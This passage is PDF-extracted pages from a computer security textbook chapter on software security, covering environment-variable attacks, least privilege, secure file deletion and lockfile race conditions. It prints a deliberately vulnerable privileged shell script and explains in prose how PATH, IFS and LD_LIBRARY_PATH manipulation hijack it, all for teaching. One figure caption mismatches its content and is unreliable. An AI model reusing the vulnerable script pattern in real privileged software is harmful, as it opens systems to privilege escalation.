10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 401, 'page_label': '400'}, page_content='400  CHAPTER 11 / SofTwARE SECuRiTy\\nMany older languages, including C, provide no explicit support for dynamically \\nallocated memory. Instead support is provided by explicitly calling standard library \\nroutines to allocate and release memory. Unfortunately, in large, complex programs, \\ndetermining exactly when dynamically allocated memory is no longer required can \\nbe a difficult task. As a consequence, memory leaks in such programs can easily occur \\nand can be difficult to identify and correct. There are library variants that implement \\nmuch higher levels of checking and debugging such allocations that can be used to \\nassist this process.\\nOther languages like Java and C ++ manage memory allocation and release \\nautomatically. While such languages do incur an execution overhead to support this \\nautomatic management, the resulting programs are generally far more reliable. The \\nuse of such languages is strongly encouraged to avoid memory management problems.\\nPreventing Race Conditions with Shared Memory\\nAnother topic of concern is management of access to common, shared memory by \\nseveral processes or threads within a process. Without suitable synchronization of \\naccesses, it is possible that values may be corrupted, or changes lost, due to over -\\nlapping access, use, and replacement of shared values. The resulting race condition \\noccurs when multiple processes and threads compete to gain uncontrolled access to \\nsome resource. This problem is a well-known and documented issue that arises when \\nwriting concurrent code, whose solution requires the correct selection and use of \\nappropriate synchronization primitives. Even so, it is neither easy nor obvious what \\nis the most appropriate and efficient choice. If an incorrect sequence of synchroniza-\\ntion primitives is chosen, it is possible for the various processes or threads to dead -\\nlock, each waiting on a resource held by the other. There is no easy way of recovering \\nfrom this flaw without terminating one or more of the programs. An attacker could \\ntrigger such a deadlock in a vulnerable program to implement a denial-of-service \\nupon it. In large complex applications, ensuring that deadlocks are not possible can \\nbe very difficult. Care is needed to carefully design and partition the problem to \\nlimit areas where access to shared memory is needed and to determine the best \\nprimitives to use.\\n 11.4 INTERACTING WITH THE OPERATING SYSTEM  \\nAND OTHER PROGRAMS\\nThe third component of our model of computer programs is that it executes on a \\n computer system under the control of an operating system. This aspect of a  computer \\nprogram is often not emphasized in introductory programming courses; however, \\nfrom the perspective of writing secure software, it is critical. Excepting dedicated \\nembedded applications, in general, programs do not run in isolation on most  computer \\nsystems. Rather, they run under the control of an operating system that mediates \\naccess to the resources of that system and shares their use between all the currently \\nexecuting programs.\\nThe operating system constructs an execution environment for a process when \\na program is run, as illustrated in Figure 10.4. In addition to the code and data for the \\nM11_STAL0611_04_GE_C11.indd   400 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 402, 'page_label': '401'}, page_content='11.4 / iNTERACTiNG wiTH THE oPERATiNG SySTEM  401\\nprogram, the process includes information provided by the operating system. These \\ninclude environment variables, which may be used to tailor the operation of the \\nprogram, and any command-line arguments specified for the program. All such data \\nshould be considered external inputs to the program whose values need validation \\nbefore use, as discussed in Section 11.2.\\nGenerally these systems have a concept of multiple users on the system. \\nResources, like files and devices, are owned by a user and have permissions granting \\naccess with various rights to different categories of users. We discussed these concepts \\nin detail in Chapter 4. From the perspective of software security, programs need \\naccess to the various resources, such as files and devices, they use. Unless appropriate \\naccess is granted, these programs will likely fail. However, excessive levels of access \\nare also dangerous because any bug in the program could then potentially compro -\\nmise more of the system.\\nThere are also concerns when multiple programs access shared resources, such \\nas a common file. This is a generalization of the problem of managing access to shared \\nmemory, which we discussed in Section 11.3. Many of the same concerns apply, and \\nappropriate synchronization mechanisms are needed.\\nWe now discuss each of these issues in more detail.\\nEnvironment Variables\\nEnvironment variables  are a collection of string values inherited by each process \\nfrom its parent that can affect the way a running process behaves. The operating sys-\\ntem includes these in the process’s memory when it is constructed. By default, they \\nare a copy of the parent’s environment variables. However, the request to execute \\na new program can specify a new collection of values to use instead. A program can \\nmodify the environment variables in its process at any time, and these in turn will be \\npassed to its children. Some environment variable names are well known and used \\nby many programs and the operating system. Others may be custom to a specific \\nprogram. Environment variables are used on a wide variety of operating systems, \\nincluding all UNIX variants, DOS and Microsoft Windows systems, and others.\\nWell-known environment variables include the variable PATH, which specifies \\nthe set of directories to search for any given command; IFS, which specifies the \\nword boundaries in a shell script; and LD_LIBRARY_PATH, which specifies the list of \\ndirectories to search for dynamically loadable libraries. All of these have been used \\nto attack programs.\\nThe security concern for a program is that these provide another path for \\nuntrusted data to enter a program and hence need to be validated. The most com -\\nmon use of these variables in an attack is by a local user on some system attempting \\nto gain increased privileges on the system. The goal is to subvert a program that grants \\nsuperuser or administrator privileges, coercing it to run code of the attacker’s selec-\\ntion with these higher privileges.\\nSome of the earliest attacks using environment variables targeted shell scripts \\nthat executed with the privileges of their owner rather than the user running them. \\nConsider the simple example script shown in Figure 11.6a. This script, which might \\nbe used by an ISP , takes the identity of some user, strips any domain specification if \\nincluded, and then retrieves the mapping for that user to an IP address. Because that \\nM11_STAL0611_04_GE_C11.indd   401 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 403, 'page_label': '402'}, page_content='402  CHAPTER 11 / SofTwARE SECuRiTy\\ninformation is held in a directory of privileged user accounting information, general \\naccess to that directory is not granted. Instead, the script is run with the privileges of \\nits owner, which does have access to the relevant directory. This type of simple utility \\nscript is very common on many systems. However, it contains a number of serious \\nflaws. The first concerns the interaction with the PATH environment  variable. This \\nsimple script calls two separate programs: sed and grep. The programmer assumes \\nthat the standard system versions of these scripts would be called. But they are speci-\\nfied just by their filename. To locate the actual program, the shell will search each \\ndirectory named in the PATH variable for a file with the desired name. The attacker \\nsimply has to redefine the PATH variable to include a directory they control, which \\ncontains a program called grep, for example. Then when this script is run, the attack-\\ner’s grep program is called instead of the standard system version. This program \\ncan do whatever the attacker desires, with the privileges granted to the shell script. \\nTo address this vulnerability, the script could be rewritten to use absolute names for \\neach program. This avoids the use of the PATH variable, though at a cost in readability \\nand portability. Alternatively, the PATH variable could be reset to a known default \\nvalue by the script, as shown in Figure 11.6b. Unfortunately, this version of the script \\nis still vulnerable, this time due to the IFS environment variable. This is used to sepa-\\nrate the words that form a line of commands. It defaults to a space, tab, or newline \\ncharacter. However, it can be set to any sequence of characters. Consider the effect \\nof including the “=” character in this set. Then the assignment of a new value to the \\nPATH variable is interpreted as a command to execute the program PATH with the \\nlist of directories as its argument. If the attacker has also changed the PATH variable \\nto include a directory with an attack program PATH, then this will be executed when \\nthe script is run. It is essentially impossible to prevent this form of attack on a shell \\nscript. In the worst case, if the script executes as the root user, then total compromise \\nof the system is possible. Some recent UNIX systems do block the setting of critical \\nenvironment variables such as these for programs executing as root. However, that \\ndoes not prevent attacks on programs running as other users, possibly with greater \\naccess to the system.\\nIt is generally recognized that writing secure, privileged shell scripts is very \\ndifficult. Hence their use is strongly discouraged. At best, the recommendation is \\nFigure 11.6 Vulnerable Shell Scripts\\n(a) Example vulnerable privileged shell script\\n(b) Still vulnerable privileged shell script\\n#!/bin/bash\\nPATH=\"/sbin:/bin:/usr/sbin:/usr/bin\"\\nexport PATH\\nuser=`echo $1   |sed \\'s/@.*$//\\'`\\ngrep $user /var/local/accounts/ipaddrs\\n#!/bin/bash\\nuser=`echo $1   |sed \\'s/@.*$//\\'`\\ngrep $user /var/local/accounts/ipaddrs\\nM11_STAL0611_04_GE_C11.indd   402 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 404, 'page_label': '403'}, page_content='to change only the group, rather than user, identity and to reset all critical environ -\\nment variables. This at least ensures the attack cannot gain superuser privileges. If a \\nscripted application is needed, the best solution is to use a compiled wrapper program \\nto call it. The change of owner or group is done using the compiled program, which \\nthen constructs a suitably safe set of environment variables before calling the desired \\nscript. Correctly implemented, this provides a safe mechanism for executing such \\nscripts. A very good example of this approach is the use of the suexec wrapper pro-\\ngram by the Apache Web server to execute user CGI scripts. The wrapper program \\nperforms a rigorous set of security checks before constructing a safe environment \\nand running the specified script.\\nEven if a compiled program is run with elevated privileges, it may still be vul-\\nnerable to attacks using environment variables. If this program executes another \\nprogram, depending on the command used to do this, the PATH variable may still \\nbe used to locate it. Hence any such program must reset this to known safe values \\nfirst. This at least can be done securely. However, there are other vulnerabilities. \\nEssentially all programs on modern computer systems use functionality provided \\nby standard library routines. When the program is compiled and linked, the code \\nfor these standard libraries could be included in the executable program file. This is \\nknown as a static link. With the use of static links every program loads its own copy \\nof these standard libraries into the computer’s memory. This is wasteful, as all these \\ncopies of code are identical. Hence most modern systems support the concept of \\ndynamic linking. A dynamically linked executable program does not include the code \\nfor common libraries, but rather has a table of names and pointers to all the func -\\ntions it needs to use. When the program is loaded into a process, this table is resolved \\nto reference a single copy of any library, shared by all processes needing it on the \\nsystem. However, there are reasons why different programs may need different ver-\\nsions of libraries with the same name. Hence there is usually a way to specify a list of \\ndirectories to search for dynamically loaded libraries. On many UNIX systems this \\nis the LD_LIBRARY_PATH environment variable. Its use does provide a degree of \\nflexibility with dynamic libraries. But again it also introduces a possible mechanism \\nfor attack. The attacker constructs a custom version of a common library, placing \\nthe desired attack code in a function known to be used by some target, dynamically \\nlinked program. Then by setting the LD_LIBRARY_PATH variable to reference the \\nattacker’s copy of the library first, when the target program is run and calls the known \\nfunction, the attacker’s code is run with the privileges of the target program. To pre-\\nvent this type of attack, a statically linked executable can be used, at a cost of memory \\nefficiency. Alternatively, again some modern operating systems block the use of this \\nenvironment variable when the program executed runs with different privileges.\\nLastly, apart from the standard environment variables, many programs use \\ncustom variables to permit users to generically change their behavior just by setting \\nappropriate values for these variables in their startup scripts. Again, such use means \\nthese variables constitute untrusted input to the program that needs to be validated. \\nOne particular danger is to merge values from such a variable with other informa -\\ntion into some buffer. Unless due care is taken, a buffer overflow can occur, with \\nconsequences as we discussed in Chapter 10. Alternatively, any of the issues with \\ncorrect interpretation of textual information we discussed in  Section\\xa0 11.2 could  \\nalso apply.\\n11.4 / iNTERACTiNG wiTH THE oPERATiNG SySTEM  403\\nM11_STAL0611_04_GE_C11.indd   403 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 405, 'page_label': '404'}, page_content='404  CHAPTER 11 / SofTwARE SECuRiTy\\nAll of these examples illustrate how care is needed to identify the way in which \\na program interacts with the system in which it executes and to carefully consider the \\nsecurity implications of these assumptions.\\nUsing Appropriate, Least Privileges\\nThe consequence of many of the program flaws we discuss in both this chapter and \\nin Chapter 10 is that the attacker is able to execute code with the privileges and \\naccess rights of the compromised program or service. If these privileges are greater \\nthan those available already to the attacker, then this results in a privilege escalation, \\nan important stage in the overall attack process. Using the higher levels of privilege \\nmay enable the attacker to make changes to the system, ensuring future use of these \\ngreater capabilities. This strongly suggests that programs should execute with the \\nleast amount of privileges needed to complete their function. This is known as the \\nprinciple of least privilege and is widely recognized as a desirable characteristic in a \\nsecure program.\\nNormally when a user runs a program, it executes with the same privileges and \\naccess rights as that user. Exploiting flaws in such a program does not benefit an \\nattacker in relation to privileges, although the attacker may have other goals, such as \\na denial-of-service attack on the program. However, there are many circumstances \\nwhen a program needs to utilize resources to which the user is not normally granted \\naccess. This may be to provide a finer granularity of access control than the standard \\nsystem mechanisms support. A common practice is to use a special system login for \\na service and make all files and directories used by the service assessable only to that \\nlogin. Any program used to implement the service runs using the access rights of this \\nsystem user and is regarded as a privileged program. Different operating systems \\nprovide different mechanisms to support this concept. UNIX systems use the set \\nuser or set group options. The access control lists used in Windows systems provide a \\nmeans to specify alternate owner or group access rights if desired. We discussed such \\naccess control concepts elaborately in Chapter 4.\\nWhenever a privileged program runs, care must be taken to determine the \\nappropriate user and group privileges required. Any such program is a potential \\ntarget for an attacker to acquire additional privileges, as we noted in the discussion \\nof concerns regarding environment variables and privileged shell scripts. One key \\ndecision involves whether to grant additional user or just group privileges. Where \\nappropriate the latter is generally preferred. This is because on UNIX and related \\nsystems, any file created will have the user running the program as the file’s owner, \\nenabling users to be more easily identified. If additional special user privileges are \\ngranted, this special user is the owner of any new files, masking the identity of the \\nuser running the program. However, there are circumstances when providing privi-\\nleged group access is not sufficient. In those cases care is needed to manage, and log \\nif necessary, use of these programs.\\nAnother concern is ensuring that any privileged program can modify only those \\nfiles and directories necessary. A common deficiency found with many privileged \\nprograms is for them to have ownership of all associated files and directories. If the \\nprogram is then compromised, the attacker has greater scope for modifying and cor-\\nrupting the system. This violates the principle of least privilege. A very common exam-\\nple of this poor practice is seen in the configuration of many Web servers and their \\nM11_STAL0611_04_GE_C11.indd   404 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 406, 'page_label': '405'}, page_content='document directories. On most systems the Web server runs with the privilege of a \\nspecial user, commonly www or similar. Generally the Web server only needs the ability \\nto read files it is serving. The only files it needs write access to are those used to store \\ninformation provided by CGI scripts, file uploads, and the like. All other files should \\nhave write access to the group of users managing them, but not the Web server. How-\\never, common practice by system managers with insufficient security awareness is to \\nassign the ownership of most files in the Web document hierarchy to the Web server. \\nConsequently, should the Web server be compromised, the attacker can then change \\nmost of the files. The widespread occurrence of Web defacement attacks is a direct \\nconsequence of this practice. The server is typically compromised by an attack such \\nas the PHP remote code injection attack we discussed in Section 11.2. This allows the \\nattacker to run any PHP code of their choice with the privileges of the Web server. The \\nattacker may then replace any pages the server has write access to. The result is almost \\ncertain embarrassment for the organization. If the attacker accesses or modifies form \\ndata saved by previous CGI script users, then more serious consequences can result.\\nCare is needed to assign the correct file and group ownerships to files and direc-\\ntories managed by privileged programs. Problems can manifest particularly when a pro-\\ngram is moved from one computer system to another or when there is a major upgrade \\nof the operating system. The new system might use different defaults for such users and \\ngroups. If all affected programs, files, and directories are not correctly updated, then \\neither the service will fail to function as desired, or worse, may have access to files it \\nshould not, which may result in corruption of files. Again this may be seen in moving \\na Web server to a newer, different system, where the Web server user might change \\nfrom www to www-data. The affected files may not just be those in the main Web server \\ndocument hierarchy but may also include files in users’ public Web directories.\\nThe greatest concerns with privileged programs occur when such programs \\nexecute with root or administrator privileges. These provide very high levels of access \\nand control to the system. Acquiring such privileges is typically the major goal of an \\nattacker on any system. Hence any such privileged program is a key target. The prin-\\nciple of least privilege indicates that such access should be granted as rarely and as \\nbriefly as possible. Unfortunately, due to the design of operating systems and the need \\nto restrict access to underlying system resources, there are circumstances when such \\naccess must be granted. Classic examples include the programs used to allow a user \\nto login or to change passwords on a system; such programs are only accessible to the \\nroot user. Another common example is network servers that need to bind to a privi-\\nleged service port. 7 These include Web, Secure Shell (SSH), SMTP mail delivery, \\nDNS, and many other servers. Traditionally, such server programs executed with root \\nprivileges for the entire time they were running. Closer inspection of the privilege \\nrequirements reveals that they only need root privileges to initially bind to the desired \\nprivileged port. Once this is done the server programs could reduce their user privi-\\nleges to those of another special system user. Any subsequent attack is then much \\nless significant. The problems resulting from the numerous security bugs in the once \\nwidely used sendmail mail delivery program are a direct consequence of it being a \\nlarge, complex monolithic program that ran continuously as the root user.\\n7Privileged network services use port numbers less than 1024. On UNIX and related systems, only the root \\nuser is granted the privilege to bind to these ports.\\n11.4 / iNTERACTiNG wiTH THE oPERATiNG SySTEM  405\\nM11_STAL0611_04_GE_C11.indd   405 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 407, 'page_label': '406'}, page_content='406  CHAPTER 11 / SofTwARE SECuRiTy\\nWe now recognize that good defensive program design requires that large, com-\\nplex programs be partitioned into smaller modules, each granted the privileges they \\nrequire, only for as long as they need them. This form of program modularization \\nprovides a greater degree of isolation between the components, reducing the conse-\\nquences of a security breach in one component. In addition, being smaller, each com-\\nponent module is easier to test and verify. Ideally the few components that require \\nelevated privileges can be kept small and subject to much greater scrutiny than the \\nremainder of the program. The popularity of the postfix mail delivery program, \\nnow widely replacing the use of sendmail in many organizations, is partly due to \\nits adoption of these more secure design guidelines.\\nA further technique to minimize privilege is to run potentially vulnerable \\nprograms in some form of sandbox that provides greater isolation and control of \\nthe executing program from the wider system. The runtime for code written in lan -\\nguages such as Java includes this type of functionality. Alternatively, UNIX-related \\nsystems provide the chroot system function to limit a program’s view of the file \\nsystem to just one carefully configured and isolated section of the file system. This \\nis known as a chroot jail. Provided this is configured correctly, even if the program \\nis compromised, it may only access or modify files in the chroot jail section of the \\nfile system. Unfortunately, correct configuration of a chroot jail is difficult. If created \\nincorrectly, the program may either fail to run correctly or worse may still be able \\nto interact with files outside the jail. While the use of a chroot jail can significantly \\nlimit the consequences of compromise, it is not suitable for all circumstances, and \\nnor is it a complete security solution. A further recently developed alternative for \\nthis is the use of containers, also known as application virtualization, which we will \\ndiscuss in Section 12.8.\\nSystems Calls and Standard Library Functions\\nExcept on very small, embedded systems, no computer program contains all of the \\ncode it needs to execute. Rather, programs make calls to the operating system to \\naccess the system’s resources and to standard library functions to perform common \\noperations. When using such functions, programmers commonly make assumptions \\nabout how they actually operate. Most of the time they do indeed seem to perform \\nas expected. However, there are circumstances when the assumptions a programmer \\nmakes about these functions are not correct. The result can be that the program does \\nnot perform as expected. Part of the reason for this is that programmers tend to focus \\non the particular program they are developing and view it in isolation. However, on \\nmost systems this program will simply be one of many running and sharing the avail-\\nable system resources. The operating system and library functions attempt to manage \\ntheir resources in a manner that provides the best performance to all the programs \\nrunning on the system. This does result in requests for services being buffered, rese-\\nquenced, or otherwise modified to optimize system use. Unfortunately, there are \\ntimes when these optimizations conflict with the goals of the program. Unless the \\nprogrammer is aware of these interactions and explicitly codes for them, the resulting \\nprogram may not perform as expected.\\nAn excellent illustration of these issues is given by Venema in his discussion \\nof the design of a secure file shredding program [VENE06]. The problem is how to \\nM11_STAL0611_04_GE_C11.indd   406 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 408, 'page_label': '407'}, page_content='securely delete a file so its contents cannot subsequently be recovered. Just using the \\nstandard file delete utility or system call does not suffice, as this simply removes the \\nlinkage between the file’s name and its contents. The contents still exist on the disk \\nuntil those blocks are eventually reused in another file. Reversing this operation is \\nrelatively straightforward, and undelete programs have existed for many years to do \\nthis. Even when blocks from a deleted file are reused, the data in the files can still be \\nrecovered because not all traces of the previous bit values are removed [GUTM96]. \\nConsequently, the standard recommendation is to repeatedly overwrite the data con-\\ntents with several distinct bit patterns to minimize the likelihood of the original data \\nbeing recovered. Hence a secure file shredding program might perhaps implement \\nthe algorithm like that shown in Figure 11.7a. However, when an obvious implemen-\\ntation of this algorithm is tried, the file contents were still recoverable afterwards. \\nVenema details a number of flaws in this algorithm that mean the program does \\nnot behave as expected. These flaws relate to incorrect assumptions about how the \\nrelevant system functions operate and include the following:\\n• When the file is opened for writing, the system will write the new data to same \\ndisk blocks as the original data. In practice, the operating system may well \\nassume that the existing data are no longer required, remove them from asso-\\nciation with the file, then allocate new unused blocks to write the data to. What \\nthe program should do is open the file for update, indicating to the operating \\nsystem that the existing data are still required.\\n• When the file is overwritten with pattern, the data are written immediately to \\ndisk. In the first instance the data are copied into a buffer in the application, \\nmanaged by the standard library file I/O routines. These routines delay writing \\nthis buffer until it is sufficiently full, the program flushes the buffer, or the file \\nis closed. If the file is relatively small, this buffer may never fill up before the \\nprogram loops round, seeks back to the start of the file, and writes the next pat-\\ntern. In such a case the library code will decide that because the previously writ-\\nten data have changed, there is no need to write the data to disk. The program \\nneeds to explicitly insist that the buffer be flushed after each pattern is written.\\n• When the I/O buffers are flushed and the file is closed, the data are then written \\nto disk. However, there is another layer of buffering in the operating system’s \\nfile handling code. This layer buffers information being read from and written \\nto files by all of the processes currently running on the computer system. It \\nthen reorders and schedules these data for reading and writing to make the \\nmost efficient use of physical device accesses. Even if the program flushes the \\ndata out of the application buffer into the file system buffer, the data will not \\nbe immediately written. If new replacement data are flushed from the program, \\nagain they will most likely replace the previous data and not be written to disk, \\nbecause the file system code will assume that the earlier values are no longer \\nrequired. The program must insist that the file system synchronize the data with \\nthe values on the device in order to ensure that the data are physically trans -\\nferred to the device. However, doing this results in a performance penalty on \\nthe system because it forces device accesses to occur at less than optimal times. \\nThis penalty impacts not just this file shredding program but every program \\ncurrently running on the system.\\n11.4 / iNTERACTiNG wiTH THE oPERATiNG SySTEM  407\\nM11_STAL0611_04_GE_C11.indd   407 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 409, 'page_label': '408'}, page_content='408  CHAPTER 11 / SofTwARE SECuRiTy\\nWith these changes, the algorithm for a secure file shredding program changes to \\nthat shown in Figure 11.7b. This is certainly more likely to achieve the desired result; \\nhowever, examined more closely, there are yet more concerns.\\nModern disk drives and other storage devices are managed by smart controllers, \\nwhich are dedicated processors with their own memory. When the operating system \\ntransfers data to such a device, the data are stored in buffers in the controller’s memory. \\nThe controller also attempts to optimize the sequence of transfers to the actual device. \\nIf it detects that the same data block is being written multiple times, the controller may \\ndiscard the earlier data values. To prevent this the program needs some way to com-\\nmand the controller to write all pending data. Unfortunately, there is no standard \\nmechanism on most operating systems to make such a request. When Apple was devel-\\noping its MacOS secure file delete program, it found it necessary to create an addi -\\ntional file control option 8 to generate this command. And its use incurs a further \\nperformance penalty on the system. But there are still more problems. If the device is \\na nonmagnetic disk (e.g., a flash memory drive), then their controllers try to minimize \\nthe number of writes to any block. This is because such devices only support a limited \\nnumber of rewrites to any block. Instead they may allocate new blocks when data are \\nrewritten instead of reusing the existing block. Also, some types of journaling file sys-\\ntems keep records of all changes made to files to enable fast recovery after a disk crash. \\nBut these records can be used to access previous data contents.\\n8The Mac OS X F_FULLFSYNC fcntl system call commands the drive to flush all buffered data to \\n permanent storage.\\nFigure 11.7 Example Global Data Overflow Attack\\n(a) Initial secure file shredding program algorithm\\n(b) Better secure file shredding program algorithm\\npatterns = [10101010, 01010101, 11001100, 00110011, 00000000, 11111111,\\n...]\\nopen file for writing\\nfor each pattern\\n  seek to start of file\\n  overwrite file contents with pattern\\nclose file\\nremove file\\npatterns = [10101010, 01010101, 11001100, 00110011, 00000000, 11111111,\\n...]\\nopen file for update\\nfor each pattern\\n  seek to start of file\\n  overwrite file contents with pattern\\n  flush application write buffers\\n  sync file system write buffers with device\\nclose file\\nremove file\\nM11_STAL0611_04_GE_C11.indd   408 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 410, 'page_label': '409'}, page_content='All of this indicates that writing a secure file shredding program is actually \\nan extremely difficult exercise. There are so many layers of code involved, each of \\nwhich makes assumptions about what the program really requires in order to pro -\\nvide the best performance. When these assumptions conflict with the actual goals \\nof the  program, the result is that the program fails to perform as expected. A secure \\nprogrammer needs to identify such assumptions and resolve any conflicts with the \\nprogram goals. Because identifying all relevant assumptions may be very difficult, it \\nalso means exhaustively testing the program to ensure that it does indeed behave \\nas expected. When it does not, the reasons should be determined and the invalid \\nassumptions identified and corrected.\\nVenema concludes his discussion by noting that in fact the program may actu-\\nally be solving the wrong problem. Rather than trying to destroy the file contents \\nbefore deletion, a better approach may in fact be to overwrite all currently unused \\nblocks in the file systems and swap space, including those recently released from \\ndeleted files.\\nPreventing Race Conditions with Shared System Resources\\nThere are circumstances in which multiple programs need to access a common \\nsystem resource, often a file containing data created and manipulated by multiple \\nprograms. Examples include mail client and mail delivery programs sharing access \\nto a user’s mailbox file, or various users of a Web CGI script updating the same \\nfile used to save submitted form values. This is a variant of the issue, discussed in \\n Section\\xa011.3— synchronizing access to shared memory. As in that case, the solution is \\nto use an appropriate synchronization mechanism to serialize the accesses to prevent \\nerrors. The most common technique is to acquire a lock on the shared file, ensuring \\nthat each process has appropriate access in turn. There are several methods used for \\nthis, depending on the operating system in use.\\nThe oldest and most general technique is to use a lockfile. A process must \\n create and own the lockfile in order to gain access to the shared resource. Any other \\nprocess that detects the existence of a lockfile must wait until it is removed before \\ncreating its own to gain access. There are several concerns with this approach. First, \\nit is purely advisory. If a program chooses to ignore the existence of the lockfile \\nand access the shared resource, then the system will not prevent this. All programs \\nusing this form of synchronization must cooperate. A more serious flaw occurs in \\nthe implementation. The obvious implementation is first to check that the lockfile \\ndoes not exist then create it. Unfortunately, this contains a fatal deficiency. Consider \\ntwo processes each attempting to check and create this lockfile. The first checks and \\ndetermines that the lockfile does not exist. However, before it is able to create the \\nlockfile, the system suspends the process to allow other processes to run. At this \\npoint the second process also checks that the lockfile does not exist, creates it, and \\nproceeds to start using the shared resource. Then it is suspended and control returns \\nto the first process, which proceeds to also create the lockfile and access the shared \\nresource at the same time. The data in the shared file will then likely be corrupted. \\nThis is a classic illustration of a race condition. The problem is that the process of \\nchecking the lockfile does not exist, and then creating the lockfile must be executed \\none after the other, without the possibility of interruption. This is known as an atomic \\noperation. The correct implementation in this case is not to test separately for the \\n11.4 / iNTERACTiNG wiTH THE oPERATiNG SySTEM  409\\nM11_STAL0611_04_GE_C11.indd   409 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 411, 'page_label': '410'}, page_content='410  CHAPTER 11 / SofTwARE SECuRiTy\\npresence of the lockfile, but always to attempt to create it. The specific options used \\nin the file create state that if the file already exists, then the attempt must fail and \\nreturn a suitable error code. If it fails, the process waits for a period and then tries \\nagain until it succeeds. The operating system implements this function as an atomic \\noperation, providing guaranteed controlled access to the resource. While the use of a \\nlockfile is a classic technique, it has the advantage that the presence of a lock is quite \\nclear because the lockfile is seen in a directory listing. It also allows the administra-\\ntor to easily remove a lock left by a program that either crashed or otherwise failed \\nto remove the lock.\\nThere are more modern and alternative locking mechanisms available for files. \\nThese may be advisory and/or mandatory, where the operating system guarantees \\nthat a locked file cannot be accessed inappropriately. The issue with mandatory locks \\nis the mechanisms for removing them should the locking process crash or otherwise \\nnot release the lock. These mechanisms are also implemented differently on differ -\\nent operating 